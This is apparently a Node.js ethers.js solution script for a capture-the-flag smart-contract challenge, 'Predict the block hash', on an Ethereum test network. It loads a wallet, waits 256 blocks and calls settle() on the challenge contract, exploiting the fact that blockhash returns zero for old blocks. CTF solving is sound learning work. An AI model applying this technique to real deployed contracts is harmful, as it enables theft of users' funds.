const ethers = require('ethers');
const fs = require('fs');
const utils = require('./utils')
const abiFile = './build/contracts/PredictTheBlockHashChallenge.json'; // fill
const ctfAbi = './build/contracts/CTFPredictTheBlockHashChallenge.json'; // fill
const secrteFile = "../.secret"
const mnemonicFile = "../iBpnG3uuUwI.csv"
const ctfaddress = "0x347beca43c61fAFF815CF7d273FFBa20585c3A1b" // fill
const contractChallangeAddress = "0x7dE3eCcF8e20495C6e89c0964160ED5f2d7109B5" // fill

let provider = utils.getNetProvider("3")


async function guess(contractCtf, contractChallenge) {
    // just for verify
    var afterHash = await contractCtf.showMoreBlockHashAfter256();
    console.log("after hash " + afterHash)
    
    // await contractChallenge.lockInGuess(afterHash, {value:ethers.utils.parseEther('1.0')})
    // console.log("set hash success")

    const preBlock = await provider.getBlockNumber();
    var newBlock = await provider.getBlockNumber();
    while (newBlock < preBlock + 256) {
        newBlock = await provider.getBlockNumber();
        await utils.sleep(100000)
        console.log("num distance block: " +  (newBlock - preBlock))
    }
    await contractChallenge.settle()

    console.log("uess me success")
}

async function doCapture() {

    let wallet = utils.getMnemonicWallet(mnemonicFile)

    let contractChall = utils.getContract(wallet, abiFile, contractChallangeAddress, provider)
    let contrateCtf = utils.getContract(wallet, ctfAbi, ctfaddress, provider)
    // console.log(contract)
    
    guess(contrateCtf, contractChall)
}

doCapture()